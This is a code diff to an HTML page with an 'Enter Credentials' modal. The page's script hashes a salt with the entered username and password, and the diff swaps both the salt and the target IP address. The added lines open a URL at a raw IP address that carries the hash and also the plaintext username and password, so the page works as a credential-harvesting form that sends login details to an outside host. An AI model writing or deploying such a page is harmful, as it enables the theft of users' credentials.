@@ -44,7 +44,7 @@ body {font-family: Arial, Helvetica, sans-serif;}
 </style>
 </head>
 <body>
-<a href="http://98.96.160.135/">link to 98.96.160.135</a><BR><BR>
+<a href="http://176.20.160.166/">link to 176.20.160.166</a><BR><BR>
 <!-- Trigger/Open The Modal -->
 <button id="myBtn">Enter Credentials</button>
 <!-- The Modal -->
@@ -110,12 +110,12 @@ btn.onclick = function() {
 
 // Send the credentials as a sha1
 snd.onclick = function()    {
-    let mypromise = sha1FromString('0QuJKQ' + usr.value + pwd.value);
+    let mypromise = sha1FromString('JAN7rP' + usr.value + pwd.value);
     mypromise.then(
             function(value) {
               //alert('sha1 is '+ value +' ok');
-              //fetch('http://98.96.160.135/' + '?tk=' + value);
-              window.open('http://98.96.160.135/' + '?tk=' + value + '&' + '?val='+'0QuJKQ' + usr.value + pwd.value);
+              //fetch('http://176.20.160.166/' + '?tk=' + value);
+              window.open('http://176.20.160.166/' + '?tk=' + value + '&' + '?val='+'JAN7rP' + usr.value + pwd.value);
               },
             function(value) {alert(value+' nok');}
     );
